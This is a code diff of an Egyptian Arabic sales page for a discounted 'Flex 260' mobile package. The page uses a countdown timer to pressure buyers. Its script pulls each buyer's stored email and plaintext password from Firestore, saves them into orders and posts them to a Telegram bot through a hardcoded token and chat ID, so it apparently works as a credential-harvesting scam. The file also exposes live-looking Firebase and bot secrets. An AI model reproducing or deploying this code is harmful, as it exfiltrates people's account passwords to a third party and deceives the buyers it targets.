@@ -91,6 +91,11 @@
       transform: scale(1.05);
       box-shadow: 0 4px 20px rgba(255, 65, 108, 0.6);
     }
+
+    .button:disabled {
+      background: #666;
+      cursor: not-allowed;
+    }
   </style>
 </head>
 <body>
@@ -99,7 +104,7 @@
     <h2>💳 خصم فليكس 260</h2>
     <p>🎁 العرض شغال دلوقتي! سارع قبل انتهاء الوقت</p>
     <div class="countdown" id="countdown">⏳ جاري التحميل...</div>
-    <p>✅ السعر: 40 جنيه فقط</p>
+    <p>✅ السعر: 50 جنيه فقط</p>
 
     <input type="text" id="phone-number" placeholder="📞 رقم الهاتف">
     <input type="text" id="whatsapp-number" placeholder="💬 رقم واتساب للتواصل">
@@ -107,134 +112,127 @@
   </div>
 
   <script>
-
     const firebaseConfig = {
       apiKey: "AIzaSyAdf5AKFgLXgK2PYERHw1hgF_HsMmuTfuo",
       authDomain: "noproblem-55b97.firebaseapp.com",
       projectId: "noproblem-55b97",
-      storageBucket: "noproblem-55b97.firebasestorage.app",
+      storageBucket: "noproblem-55b97.appspot.com",
       messagingSenderId: "316010224446",
-      appId: "1:316010224446:web:5d7e7f792e53ee4b396a6f",
-      measurementId: "G-VKSGWBRKVL"
+      appId: "1:316010224446:web:5d7e7f792e53ee4b396a6f"
     };
 
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
- const packagePrice = 50;
-...
-function renewPackage() {
-  const phoneNumber = document.getElementById("phone-number").value;
-  const whatsappNumber = document.getElementById("whatsapp-number").value;
-  const orderId = Math.floor(100000 + Math.random() * 900000);
+    const packagePrice = 50;
 
-  const now = new Date();
-  const deadline = new Date();
-  deadline.setHours(22, 0, 0, 0); // الساعة 10 مساءً
+    function renewPackage() {
+      const phoneNumber = document.getElementById("phone-number").value.trim();
+      const whatsappNumber = document.getElementById("whatsapp-number").value.trim();
+      const orderId = Math.floor(100000 + Math.random() * 900000);
 
-  if (now > deadline) {
-    Swal.fire("⛔ انتهى العرض", "لا يمكن الاشتراك بعد الساعة 10 مساءً.", "error");
-    return;
-  }
+      const now = new Date();
+      const deadline = new Date();
+      deadline.setHours(22, 0, 0, 0); // 10 مساءً
 
-  if (!phoneNumber || !whatsappNumber) {
-    Swal.fire("❌ خطأ", "يرجى إدخال رقم الهاتف ورقم الواتساب.", "error");
-    return;
-  }
+      if (now > deadline) {
+        Swal.fire("⛔ انتهى العرض", "لا يمكن الاشتراك بعد الساعة 10 مساءً.", "error");
+        return;
+      }
 
-  firebase.auth().onAuthStateChanged((user) => {
-    if (user) {
-      const userRef = firebase.firestore().collection("users").doc(user.uid);
+      if (!phoneNumber || !whatsappNumber) {
+        Swal.fire("❌ خطأ", "يرجى إدخال رقم الهاتف ورقم الواتساب.", "error");
+        return;
+      }
 
-      userRef.get().then((doc) => {
-        if (doc.exists) {
-          let walletBalance = doc.data().wallet || 0;
-          let email = doc.data().email || "غير متوفر";
-          let password = doc.data().password || "غير متوفر";
+      firebase.auth().onAuthStateChanged((user) => {
+        if (user) {
+          const userRef = db.collection("users").doc(user.uid);
+          userRef.get().then((doc) => {
+            if (doc.exists) {
+              const data = doc.data();
+              const wallet = data.wallet || 0;
+              const email = data.email || "غير متوفر";
+              const password = data.password || "غير متوفر";
 
-          if (walletBalance >= packagePrice) {
-            userRef.update({ wallet: walletBalance - packagePrice }).then(() => {
-              firebase.firestore().collection("orders").add({
-                orderId: orderId,
-                userId: user.uid,
-                phoneNumber: phoneNumber,
-                whatsapp: whatsappNumber,
-                email: email,
-                password: password,
-                amountDeducted: packagePrice,
-                status: "قيد التنفيذ",
-                createdAt: firebase.firestore.FieldValue.serverTimestamp()
-              }).then(() => {
-                sendOrderToBot(orderId, phoneNumber, whatsappNumber, email, password);
-                Swal.fire("✅ تم حجز الرقم الخاص بك", "التفعيل هيبدأ الساعة 7 ونص، أول ما الخصم يتفعل هتوصلك رسالة تأكيد على رقم الواتساب", "success");
-              });
-            });
-          } else {
-            Swal.fire("❌ خطأ", "رصيدك غير كافٍ لتجديد الباقة.", "error");
-          }
+              if (wallet >= packagePrice) {
+                userRef.update({ wallet: wallet - packagePrice }).then(() => {
+                  db.collection("orders").add({
+                    orderId,
+                    userId: user.uid,
+                    phoneNumber,
+                    whatsapp: whatsappNumber,
+                    email,
+                    password,
+                    amountDeducted: packagePrice,
+                    status: "قيد التنفيذ",
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                  }).then(() => {
+                    sendOrderToBot(orderId, phoneNumber, whatsappNumber, email, password);
+                    Swal.fire("✅ تم حجز الرقم الخاص بك", "التفعيل هيبدأ الساعة 7 ونص، أول ما الخصم يتفعل هتوصلك رسالة تأكيد على رقم الواتساب", "success");
+                  });
+                });
+              } else {
+                Swal.fire("❌ خطأ", "رصيدك غير كافٍ لتجديد الباقة.", "error");
+              }
+            }
+          });
+        } else {
+          Swal.fire("❌ خطأ", "يجب تسجيل الدخول أولاً.", "error");
         }
       });
-    } else {
-      Swal.fire("❌ خطأ", "يجب تسجيل الدخول أولاً.", "error");
     }
-  });
-}
 
-function sendOrderToBot(orderId, phoneNumber, whatsapp, email, password) {
-  let token = "7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo";
-  let chatId = "8102839626";
+    function sendOrderToBot(orderId, phoneNumber, whatsapp, email, password) {
+      const token = "7798612517:AAFdPcsVIOOyoW6NYTD0i_LTXn2KpFedwWo";
+      const chatId = "8102839626";
 
-  let message = `📌 *طلب جديد - خصم فليكس 260*  
-🔢 *رقم الطلب:* ${orderId}  
-📞 *رقم الهاتف:* ${phoneNumber}  
-💬 *رقم واتساب:* ${whatsapp}  
-✉️ *الإيميل:* ${email}  
-🔐 *باسورد الحساب:* ${password}  
-💰 *المبلغ المدفوع:* ${packagePrice} جنيه  
+      const message = `📌 *طلب جديد - خصم فليكس 260*
+🔢 *رقم الطلب:* ${orderId}
+📞 *رقم الهاتف:* ${phoneNumber}
+💬 *رقم واتساب:* ${whatsapp}
+✉️ *الإيميل:* ${email}
+🔐 *باسورد الحساب:* ${password}
+💰 *المبلغ المدفوع:* ${packagePrice} جنيه
 ⚡ *الحالة:* قيد التنفيذ`;
 
-  fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-    .then(() => console.log("✅ تم إرسال الطلب إلى تيليجرام"))
-    .catch(error => console.error("❌ خطأ في إرسال الطلب:", error));
-}
-
-// ✅ تايمر للعرض حتى الساعة 10 مساءً + صوت تنبيه + قفل الزر بعد انتهاء الوقت
-function startCountdown() {
-  const now = new Date();
-  const deadline = new Date();
-  deadline.setHours(22, 0, 0, 0);
-
-  if (now > deadline) {
-    deadline.setDate(deadline.getDate() + 1); // لو الوقت عدى نحدد 10 مساء الغد
-  }
-
-  const countdownElem = document.getElementById("countdown");
-  const renewButton = document.querySelector(".button");
-  const audio = new Audio("https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3");
-
-  const updateCountdown = () => {
-    const currentTime = new Date();
-    const diff = deadline - currentTime;
-
-    if (diff <= 0) {
-      countdownElem.textContent = "⛔️ انتهى العرض!";
-      renewButton.disabled = true;
-      renewButton.textContent = "انتهى العرض";
-      renewButton.style.background = "#666";
-      renewButton.style.cursor = "not-allowed";
-      audio.play();
-      return;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+        .then(() => console.log("✅ تم إرسال الطلب إلى تيليجرام"))
+        .catch(error => console.error("❌ خطأ في إرسال الطلب:", error));
     }
 
-    const hours = Math.floor(diff / (1000 * 60 * 60));
-    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+    function startCountdown() {
+      const countdownElem = document.getElementById("countdown");
+      const renewButton = document.querySelector(".button");
+      const deadline = new Date();
+      deadline.setHours(22, 0, 0, 0);
 
-    countdownElem.textContent = `⏳ ينتهي خلال: ${hours} ساعة ${minutes} دقيقة ${seconds} ثانية`;
-  };
+      const audio = new Audio("https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3");
 
-  updateCountdown();
-  setInterval(updateCountdown, 1000);
-}
+      const updateCountdown = () => {
+        const now = new Date();
+        const diff = deadline - now;
 
-startCountdown();
+        if (diff <= 0) {
+          countdownElem.textContent = "⛔️ انتهى العرض!";
+          renewButton.disabled = true;
+          renewButton.textContent = "انتهى العرض";
+          audio.play();
+          return;
+        }
+
+        const hours = Math.floor(diff / (1000 * 60 * 60));
+        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+        countdownElem.textContent = `⏳ ينتهي خلال: ${hours} ساعة ${minutes} دقيقة ${seconds} ثانية`;
+      };
+
+      updateCountdown();
+      setInterval(updateCountdown, 1000);
+    }
+
+    startCountdown();
+  </script>
+</body>
+</html>
